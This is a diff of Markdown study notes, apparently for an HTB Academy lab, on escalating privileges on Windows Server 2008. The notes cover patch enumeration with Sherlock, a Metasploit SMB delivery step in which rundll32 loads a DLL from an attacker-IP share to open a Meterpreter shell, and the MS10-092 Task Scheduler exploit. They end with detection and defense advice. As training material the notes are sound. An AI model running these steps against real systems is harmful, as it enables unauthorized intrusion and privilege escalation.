@@ -1,4 +1,4 @@
-# Windows Server 2008 Exploitation
+# 🖥️ Windows Server 2008
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 📊 Security Feature Comparison
 
 ### Server Version Security Matrix
+
 ```cmd
 Feature                              | 2008 R2 | 2012 R2 | 2016 | 2019
 -------------------------------------|---------|---------|------|------
@@ -25,6 +26,7 @@ Control Flow Guard                    |    ❌   |    ❌   |  ✅  |  ✅
 ## 🔍 Patch Level Enumeration
 
 ### WMI Hotfix Query
+
 ```cmd
 # Check installed patches:
 wmic qfe
@@ -37,6 +39,7 @@ http://support.microsoft.com/?kbid=2533552  KB2533552  3/31/2021    WINLPE-2K8\A
 ```
 
 ### System Information Gathering
+
 ```cmd
 # Comprehensive system details:
 systeminfo
@@ -51,6 +54,7 @@ systeminfo
 ## 🔧 Sherlock Vulnerability Assessment
 
 ### Sherlock Script Usage
+
 ```powershell
 # Set execution policy:
 Set-ExecutionPolicy bypass -Scope process
@@ -62,6 +66,7 @@ Find-AllVulns
 ```
 
 ### Common Server 2008 Vulnerabilities
+
 ```cmd
 # Typical Sherlock findings:
 MS10-092 (CVE-2010-3338)  # Task Scheduler XML - Appears Vulnerable
@@ -77,6 +82,7 @@ MS16-016 (WebDAV)         # Not supported on 64-bit systems
 ## 🚀 Metasploit Privilege Escalation
 
 ### SMB Delivery Module Setup
+
 ```bash
 # Start Metasploit:
 sudo msfconsole -q
@@ -93,6 +99,7 @@ rundll32.exe \\<attacker_ip>\<share>\test.dll,0
 ```
 
 ### Initial Shell Acquisition
+
 ```cmd
 # Execute on target (Command Prompt):
 rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
@@ -102,6 +109,7 @@ rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
 ```
 
 ### Process Migration for 64-bit
+
 ```cmd
 # Check current process:
 meterpreter > getpid
@@ -119,6 +127,7 @@ meterpreter > background
 ```
 
 ### MS10-092 Privilege Escalation
+
 ```bash
 # Use Task Scheduler exploit:
 use exploit/windows/local/ms10_092_schelevator
@@ -140,6 +149,7 @@ exploit
 ## 🎯 HTB Academy Lab Walkthrough
 
 ### Lab Environment
+
 ```cmd
 # Access: RDP with htb-student:HTB_@cademy_stdnt!
 # Target: Windows Server 2008 R2
@@ -149,6 +159,7 @@ exploit
 ### Step-by-Step Solution
 
 #### 1. Initial Access
+
 ```bash
 # Connect via RDP:
 rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <target_ip>
@@ -157,6 +168,7 @@ rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <target_ip>
 ```
 
 #### 2. Patch Level Enumeration
+
 ```cmd
 # Open Command Prompt and check patches:
 wmic qfe
@@ -167,6 +179,7 @@ http://support.microsoft.com/?kbid=2533552  KB2533552  3/31/2021
 ```
 
 #### 3. Vulnerability Assessment
+
 ```powershell
 # Set PowerShell execution policy:
 Set-ExecutionPolicy bypass -Scope process
@@ -184,6 +197,7 @@ MS16-032 - Secondary Logon Handle - Appears Vulnerable
 ```
 
 #### 4. Metasploit Setup (Attack Machine)
+
 ```bash
 # Start Metasploit:
 sudo msfconsole -q
@@ -199,6 +213,7 @@ exploit
 ```
 
 #### 5. Initial Shell (Target Machine)
+
 ```cmd
 # Execute in Command Prompt on target:
 rundll32.exe \\<your_vpn_ip>\<share>\test.dll,0
@@ -207,6 +222,7 @@ rundll32.exe \\<your_vpn_ip>\<share>\test.dll,0
 ```
 
 #### 6. Process Migration (Attack Machine)
+
 ```bash
 # Interact with session:
 sessions -i 1
@@ -220,6 +236,7 @@ bg
 ```
 
 #### 7. Privilege Escalation
+
 ```bash
 # Use MS10-092 exploit:
 use exploit/windows/local/ms10_092_schelevator
@@ -232,6 +249,7 @@ exploit
 ```
 
 #### 8. Flag Retrieval
+
 ```cmd
 # Drop to shell:
 shell
@@ -245,6 +263,7 @@ type C:\Users\Administrator\Desktop\flag.txt
 ## 🔄 Alternative Privilege Escalation Methods
 
 ### Manual Exploit Compilation
+
 ```cmd
 # For environments where Metasploit is restricted:
 # Download exploit source code from exploit-db
@@ -258,6 +277,7 @@ type C:\Users\Administrator\Desktop\flag.txt
 ```
 
 ### PowerShell-Based Exploits
+
 ```powershell
 # PowerUp for comprehensive enumeration:
 Import-Module .\PowerUp.ps1
@@ -272,6 +292,7 @@ Get-ModifiableService
 ## 🛠️ Legacy System Considerations
 
 ### Business Context Assessment
+
 ```cmd
 # Consider before recommending removal:
 - Mission-critical software dependencies
@@ -289,6 +310,7 @@ Get-ModifiableService
 ```
 
 ### Risk Mitigation Strategies
+
 ```cmd
 # When systems cannot be upgraded:
 - Network segmentation/isolation
@@ -303,6 +325,7 @@ Get-ModifiableService
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Sherlock script execution
@@ -314,6 +337,7 @@ Get-ModifiableService
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Legacy system protection:
 - Apply all available security patches
@@ -335,6 +359,6 @@ Get-ModifiableService
 6. **Business context** critical when dealing with legacy systems
 7. **Multiple escalation vectors** available on unpatched systems
 
----
+***
 
-*Windows Server 2008 systems represent high-value targets due to missing security features and unpatched vulnerabilities, but business considerations must guide remediation recommendations.* 
+_Windows Server 2008 systems represent high-value targets due to missing security features and unpatched vulnerabilities, but business considerations must guide remediation recommendations._
